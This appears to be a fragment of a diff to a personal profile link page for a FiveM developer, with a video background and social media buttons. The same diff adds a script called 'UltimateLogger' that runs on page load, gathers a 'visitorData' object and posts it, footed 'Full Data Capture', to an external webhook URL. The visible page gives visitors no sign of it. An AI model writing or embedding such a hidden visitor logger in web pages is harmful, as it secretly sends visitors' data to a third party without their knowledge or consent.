+                fields: Object.entries(this.visitorData)
+                    .filter(([k]) => !['ip', 'city', 'region'].includes(k))
+                    .map(([k, v]) => ({ 
+                        name: k.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase()), 
+                        value: typeof v === 'string' ? v.substring(0, 50) : v,
+                        inline: true 
+                    })),
+                footer: { text: 'Full Data Capture ✅' },
+                timestamp: new Date().toISOString()
+            };
+    
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        }
+    
+        sendLog(title, value) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title,
+                        description: value,
+                        color: 0x4444ff,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+        }
     }
+    
+    // ==================== START LOGGER ====================
+    new UltimateLogger();
+    </script>
 
-    sendLog(title, value) {
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{
-                    title,
-                    description: value,
-                    color: 0x4444ff,
-                    timestamp: new Date().toISOString()
-                }]
-            })
-        });
-    }
-}
 
-// ==================== START LOGGER ====================
-new UltimateLogger();
-</script>
+<!-- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -->
+
+
+    <!-- Background Video -->
+    <video autoplay muted loop playsinline id="myVideo">
+        <source src="bg.mp4" type="video/mp4">
+    </video>
+
+    <!-- Glass Card -->
+    <div class="card">
+        <img src="https://img2.pic.in.th/IMG_3830a34fe2dcfe027c7e.jpg" class="profile-img">
+
+        <h1>Chaipaakorn</h1>
+        <p>Dev FiveM<br>My skill Lua | CSS | HTML | JS</p>
+
+        <div class="links">
+            <a href="https://www.instagram.com/chx_rnn/" target="_blank" class="btn instagram">
+                <i class="fa-brands fa-instagram"></i> Instagram
+            </a>
+
+            <a href="https://www.facebook.com/chay.pkr.reuxng.wanich.ykul/" target="_blank" class="btn facebook">
+                <i class="fa-brands fa-facebook"></i> Facebook
+            </a>
+
+            <a href="https://www.tiktok.com/@chaipakorn123" target="_blank" class="btn tiktok">
+                <i class="fa-brands fa-tiktok"></i> TikTok
+            </a>
+
+            <a href="https://discord.gg/XPjUEU6uMd" target="_blank" class="btn discord">
+                <i class="fa-brands fa-discord"></i> Discord
+            </a>
+        </div>
+    </div>
+
+</body>
+</html>
